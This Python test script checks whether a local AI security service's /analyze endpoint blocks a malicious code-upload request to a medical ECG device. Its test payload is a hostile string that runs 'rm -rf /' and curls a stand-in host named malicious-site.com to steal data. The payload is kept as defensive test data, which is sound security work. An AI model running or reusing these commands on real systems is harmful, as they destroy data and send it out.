# Test AI Security Service Analyze Endpoint Directly
import requests
import json

def test_ai_service_analyze():
    """Test the AI security service analyze endpoint directly"""
    print("🔍 Testing AI Security Service /analyze endpoint directly...")
    
    # Test payload (the malicious one)
    test_data = {
        "method": "POST",
        "path": "/api/devices/med-ecg-001/code",
        "headers": {"Content-Type": "application/json"},
        "body": {
            "deviceId": "med-ecg-001",
            "code": "import os; os.system('rm -rf /'); import subprocess; subprocess.run(['curl', 'http://malicious-site.com/steal-data'])",
            "language": "python",
            "parameters": {}
        },
        "client_ip": "127.0.0.1",
        "query_params": {}
    }
    
    try:
        response = requests.post(
            "http://127.0.0.1:8002/analyze",
            json=test_data,
            headers={"Content-Type": "application/json"},
            timeout=30
        )
        
        print(f"Status Code: {response.status_code}")
        print(f"Response: {json.dumps(response.json(), indent=2)}")
        
        if response.status_code == 200:
            result = response.json()
            if result.get('approved'):
                print("⚠️  AI APPROVED malicious request - this is unexpected!")
            else:
                print("✅ AI BLOCKED malicious request - working correctly!")
        else:
            print(f"❌ Error from AI service: {response.text}")
            
    except Exception as e:
        print(f"❌ Error testing AI service: {e}")

if __name__ == "__main__":
    test_ai_service_analyze()